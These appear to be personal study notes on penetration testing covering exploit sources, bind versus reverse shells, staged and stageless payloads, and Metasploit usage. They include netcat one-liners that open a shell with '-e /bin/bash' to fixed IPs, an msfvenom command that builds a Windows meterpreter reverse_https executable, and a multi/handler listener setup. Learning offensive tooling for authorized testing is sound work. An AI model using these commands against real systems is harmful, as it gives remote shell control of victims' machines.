# Finding Exploits

Publicably known exploits can be found on websites like Rapid7 by Metasploit , ExploitDb by Kali Community , Github Repos and Cli tool searchsploit ( offline version of Exploitdb ) .

# Reverse Shells vs Bind Shells

| Feature | Bind Shell | Reverse Shell |
| :--- | :--- | :--- |
| **Connection Initiation** | Attacker connects to a listening port on the target. | Target machine initiates a connection back to the attacker. |
| **Listener Location** | Listener runs on the target machine. | Listener runs on the attacker's machine. |
| **Common Use Cases** | Often used for persistence and direct control. | Commonly used for initial access and bypassing firewalls. |
| **Firewall Bypass** | More likely to be blocked by firewalls. | Can bypass firewalls as the target connects outward. |
| **IP Address Requirement** | Attacker must know the victim's IP address. | Attacker does not need to know the victim's IP address. |
| **Security Implications** | Exposes a port on the target, making it vulnerable. | Less exposure since the connection is initiated by the target. |
| **Typical Protocols Used** | Often uses TCP/UDP directly on specified ports. | Frequently utilizes HTTP/S or other common protocols to avoid detection. |
| **Netcat Syn** |nc -v 192.2.44.10 4444 >> nc -nvlp 4444 -e /bin/bash | nc 192.2.44.9 4444 -e /bin/bash  >> nc -lvnp 4444 ;|

## Staged vs Stageless Payloads

| Feature | Staged Payload | Non-Staged (Stageless) Payload |
| :--- | :--- | :--- |
| **Definition** | Composed of multiple parts, including a stager and the final payload. | A self-contained package that includes everything needed to execute. |
| **Execution Process** | Requires an initial stager to connect and download the final payload. | Executes in a single step without needing to download additional components. |
| **File Size** | Generally smaller due to the separation of stages. | Typically larger since it contains all necessary code in one executable. |
| **Complexity** | More complex due to multiple components and stages. | Simpler as it is a single executable with all functionalities embedded. |
| **Network Dependency** | Needs network connectivity for the stager to retrieve the final payload. | Can operate independently once executed, as it does not require additional downloads. |
| **Stealth and Detection** | More detectable due to multiple network interactions and the presence of a stager. | Generally stealthier as it minimizes network interactions and executes directly. |
| **Examples** | windows/x64/vncinject/reverse_tcp | osx/x64/meterpreter_reverse_tcp

# Metasploit Framework 

Command to start   ` msfconsole `

Different modules in msfvenom ( *payload generating utility of metasploit framework*  ) -
- Exploits -- Exploits are modules that leverage vulnerabilities to gain unauthorized access or control of systems. They represent the attack vector against a target.

- Auxilliary -- Auxiliary modules provide additional functionality for reconnaissance, enumeration, and other pre/post-exploitation tasks.

- Posts -- Post-exploitation modules execute after successful exploitation, providing additional capabilities like privilege escalation, credential harvesting, or data exfiltration.

- Payloads -- Payloads define the action performed after exploiting a vulnerability. These include reverse shells, bind shells, or custom code execution.

- Encoders -- Encoders transform payloads to evade detection by security mechanisms like antivirus software.

- NOPs -- NOP (No-Operation) sleds are sequences of bytes used to pad payloads, ensuring proper alignment during execution.

- Evasion -- Evasion techniques modify exploits/payloads to bypass security controls, firewalls, or IDS/IPS systems.

## General Imp Msf commands ~ 
``` bash
show evasion
search vsftpd 
search type:remote
search platform:windows
use exploit/unix/ftp/vsftpd_234_backdor OR use 1
> info
> set RHOST 1.1.1.1
> unset RHOST
> options
> show targets
> show payloads
> exploit
> exit 

show auxiliary
use 1
> run
```

## Payloads by msfvenom 
``` bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.27.223 LPORT=4444 -f exe -o windows_payload.exe
```

**For listening meterpreter request we can use multi handler of metasploit framework -**
```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 192.168.27.223
set LPORT 4444
exploit
```

**By this we can get remote control of compromised device through shell .**